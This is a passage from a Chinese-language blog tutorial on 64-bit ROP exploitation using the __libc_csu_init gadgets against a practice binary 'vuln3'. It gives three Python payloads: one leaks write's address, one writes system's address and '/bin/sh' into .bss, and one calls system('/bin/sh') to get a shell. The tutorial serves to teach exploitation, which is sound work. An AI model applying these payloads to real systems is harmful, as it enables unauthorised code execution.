<p>可以看到利用0x400606处的代码我们可以控制<code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code>和<code>r15</code>的值，随后利用0x4005f0处的代码，可以将<code>r15</code>, <code>r14</code>, <code>r13</code>的值赋给<code>rdx</code>, <code>rsi</code>, <code>edi</code>。接着调用<code>call qword ptr [r12+rbx*8]</code>。只要将<code>rbx</code>的值设为0，再构造栈上的数据就可以控制pc去调用相关函数了。<br>执行完call之后，程序会对rbx+1，然后比较rbp和rbx的值，如果相等就继续执行并ret到想要继续执行的地址。为了让rbp和rbx的值相等，可以将rbp的值设为1，因为之前把rbx设为了0。<br>先构造payload1，利用write()输出write在内存中的地址。因为gadget是call qword ptr <code>[r12+rbx*8]</code>，所以应该使用write.got而不是write.plt的地址(got里存的是地址，plt里存的是指令)。并且为了返回原程序中，重复利用buffer overflow，我们需要再次覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rdi = r13, rsi = r14, rdx = r15</span></span><br><span class="line"><span class="comment"># write(rdi = 1, rsi = write.got, rdx = 4)</span></span><br><span class="line">payload1 = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span></span><br><span class="line"><span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeff</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># mov rdx,r15; mov rsi,r14; mov edi,r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload1 += p64(<span class="number">0x4005f0</span>)</span><br><span class="line">payload1 += <span class="string">&quot;\x00&quot;</span> * <span class="number">0x38</span></span><br><span class="line">payload1 += p64(main)</span><br></pre></td></tr></table></figure>
<p>exp接收到write()在内存中的地址后，可以计算出system()在内存中的地址。构造payload2，利用read()将system()的地址以及”/bin/sh”写入到.bss段内存中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read(rdi = 0, rsi = bss_addr, rdx = 16)</span></span><br><span class="line">payload2 = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x4005f0</span>)</span><br><span class="line">payload2 += <span class="string">&quot;\x00&quot;</span> * <span class="number">0x38</span></span><br><span class="line">payload2 += p64(main)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>.bss段的地址:<br>$ readelf -S vuln3<br>There are 30 section headers, starting at offset 0x1150:<br>Section Headers:<br>  [Nr] Name              Type             Address           Offset       Size              EntSize          Flags  Link  Info  Align<br>  …<br>  [25] .bss              NOBITS           0000000000601028  00001028       0000000000000010  0000000000000000  WA       0     0     8<br> …</p>
</blockquote>
<p>最后构造payload3，调用system()函数执行”/bin/sh”。system()的地址保存在了.bss段首地址上，”/bin/sh”的地址保存在了.bss段首地址+8字节上。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</span></span><br><span class="line">payload3 = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span></span><br><span class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(<span class="number">0x4005f0</span>)</span><br><span class="line">payload3 += <span class="string">&quot;\x00&quot;</span> * <span class="number">0x38</span></span><br><span class="line">payload3 += p64(main)</span><br></pre></td></tr></table></figure>
<p>最终的<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1gf4jGRL">exp</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/7551">http://drops.wooyun.org/papers/7551</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Bruce Fan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">125</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
